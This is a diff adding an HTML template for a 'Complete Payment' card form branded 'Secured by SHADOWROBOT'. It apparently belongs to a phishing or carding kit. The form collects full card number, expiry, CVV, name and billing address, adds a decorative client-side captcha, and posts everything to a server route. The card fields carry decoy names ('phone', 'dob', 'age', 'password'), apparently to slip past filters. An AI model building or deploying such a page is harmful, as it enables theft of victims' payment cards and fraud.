@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    
+    <title>Complete Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0d1117;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .payment-box {
+            background: #161b22;
+            padding: 0px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(15, 255, 0, 0.3);
+            width: 300px;
+            margin: 50px auto;
+            border-color: #0f0;
+            border: 2px solid rgba(0, 255, 0, 1.0); /* Green Border */
+        }
+
+        h2 {
+            color: #0f0;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+        }
+
+        .card-icons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 5px;
+        }
+
+        .card-icons img {
+            width: 35px;
+            height: auto;
+            filter: drop-shadow(0 0 3px rgba(0, 255, 255, 0.7));
+        }
+
+        .payment-box label {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .payment-box input, .payment-box select {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #0f0;
+            background: transparent;
+            color: #fff;
+            border-radius: 6px;
+            margin-top: 5px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .dob-age-container {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .dob-age-container input {
+            width: 48%;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #0f0;
+        }
+
+        .card-type-display {
+            font-size: 14px;
+            color: #0f0;
+            text-align: left;
+            margin-top: 5px;
+        }
+
+        button {
+            background: #0f0;
+            color: #000;
+            font-weight: bold;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 70%;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #00d9ff;
+        }
+
+        p {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 10px;
+        }
+
+
+        .payment-container {
+            max-width: 1200px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        h2 {
+            text-align: center;
+            font-size: 2rem;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .machine-details {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .machine-details h3 {
+            font-size: 1.8rem;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .machine-details p {
+            font-size: 1rem;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        
+        .machine-details .price {
+            font-size: 1.4rem;
+            color: #2ecc71;
+            font-weight: bold;
+        }
+        
+    </style>
+</head>
+<body>
+
+    <div class="payment-box">
+        <h2>Add Card Payment</h2>
+
+        <div class="card-icons">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="MasterCard">
+    
+    <i class="fa-brands fa-cc-discover fa-2x"></i>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express">
+    <i class="fa-brands fa-cc-diners-club fa-2x"></i>
+</div>
+
+
+
+        <form id="SignupForm" method="POST" action="{{ url_for('payment') }}">
+        <div class="card-type-display" id="card-type-display"></div>
+            <label for="name_selection">Card Type</label>
+            <select id="name_selection" name="name_selection" required>
+                <option value="" disabled selected>Select your Card Type</option>
+                <option value="Visa Debit">Visa Debit</option>
+                <option value="MasterCard Debit">MasterCard Debit</option>
+                <option value="Discover Debit">Discover Debit</option>
+                <option value="American Express">American Express</option>
+                <option value="Diners">Diners</option></option>
+            </select>
+            
+
+            <label for="phone">Card Number</label>
+            <input type="text" id="phone" name="phone" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            <label for="cardname">Cardholder Name</label>
+            <input type="text" id="cardname" name="cardname" placeholder="Name on card" required>
+            
+
+            <div class="dob-age-container">
+                <div>
+                    <label for="dob">Expiry Date</label>
+                    <input type="text" id="dob" name="dob" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div>
+                    <label for="age">CVV/CVC</label>
+                    <input type="text" id="age" name="age" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <label for="country">Country</label>
+            <input type="text" id="country" name="country" placeholder="Your Country" required>
+
+            <label for="postalcode">Postal Code</label>
+            <input type="text" id="postalcode" name="postalcode" placeholder="Postal Code" maxlength="5" required>
+            <label for="address1">Address Line 1</label>
+            <input type="text" id="address1" name="address1" required>
+
+            <label for="address2">Address Line 2 (Optional)</label>
+            <input type="text" id="address2" name="address2">
+
+            <label for="city">City</label>
+            <input type="text" id="city" name="city" required>
+
+
+            <label for="password">Captcha</label>
+        <div id="random-letters" style="font-size: 12px; color: #fff;"></div>
+        <div class="password-input-container">
+          <input type="password" id="password" name="password" placeholder="Captcha code" required>
+                <span class="password-toggle" onclick="togglePasswordVisibility()">👁</span>
+            </div>
+
+            <button type="submit">Proceed</button>
+            <p>Secured by SHADOWROBOT</p>
+        </form>
+    </div>
+
+    <script>
+        function handleSignup(event) {
+            event.preventDefault();
+            const form = document.getElementById("SignupForm");
+            if (!form.checkValidity()) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+            form.submit();
+        }
+
+        document.getElementById("SignupForm").addEventListener("submit", handleSignup);
+
+        document.getElementById("postalcode").addEventListener("input", function (e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
+        });
+        
+        
+    document.getElementById("phone").addEventListener("input", function (e) {
+        let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+        e.target.value = value.substring(0, 19);
+        detectCardType(value);
+    });
+
+    function detectCardType(cardNumber) {
+    const cardDisplay = document.getElementById("card-type-display");
+    const nameSelection = document.getElementById("name_selection");
+
+    if (/^4/.test(cardNumber)) {
+        cardDisplay.innerText = "Card Type: Visa";
+        nameSelection.value = "Visa Debit"; // Auto select Visa
+    } else if (/^5[1-5]/.test(cardNumber)) {
+        cardDisplay.innerText = "Card Type: MasterCard";
+        nameSelection.value = "MasterCard Debit"; // Auto select MasterCard
+    } else if (/^6/.test(cardNumber)) {
+        cardDisplay.innerText = "Card Type: Discover";
+        nameSelection.value = "Discover Debit"; // Auto select Discover
+    } else if (/^34|37/.test(cardNumber)) {
+        cardDisplay.innerText = "Card Type: American Express";
+        nameSelection.value = "American Express"; // Auto select American Express
+    } else if (/^30[0-5]|36|38/.test(cardNumber)) {
+        cardDisplay.innerText = "Card Type: Diners";
+        nameSelection.value = "Diners"; // Auto select Diners Club
+    } else {
+        cardDisplay.innerText = "";
+        nameSelection.value = ""; // Clear selection if card is unrecognized
+    }
+}
+
+
+        document.getElementById("age").addEventListener("input", function (e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+
+        document.getElementById("dob").addEventListener("input", function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
+            e.target.value = value;
+        });
+
+        function togglePasswordVisibility() {
+    const passwordInput = document.getElementById('password');
+    const toggleIcon = document.querySelector('.password-toggle');
+
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.innerText = '🔒'; // Closed eye icon when visible
+    } else {
+        passwordInput.type = 'password';
+        toggleIcon.innerText = '👁'; // Open eye icon when hidden
+    }
+}
+
+// Ensure captcha input is hidden by default
+document.addEventListener("DOMContentLoaded", function () {
+    document.getElementById("password").type = "password";
+});
+
+        
+    // Generate random security letters for display
+    function generateRandomLetters(length) {
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        let result = "";
+        for (let i = 0; i < length; i++) {
+            result += letters.charAt(Math.floor(Math.random() * letters.length));
+        }
+        return result;
+    }
+    
+    const randomLetters = generateRandomLetters(5);
+    document.getElementById("random-letters").innerText = randomLetters;
+    
+    document.getElementById("SignupForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+    
+        const captchaInput = document.getElementById("password").value;
+        if (captchaInput !== randomLetters) {
+            alert('Captcha code is incorrect.');
+            return;
+        }
+        // If the captcha matches, submit the form
+        event.target.submit();
+    });
+
+
+
+    </script>
+
+</body>
+</html>
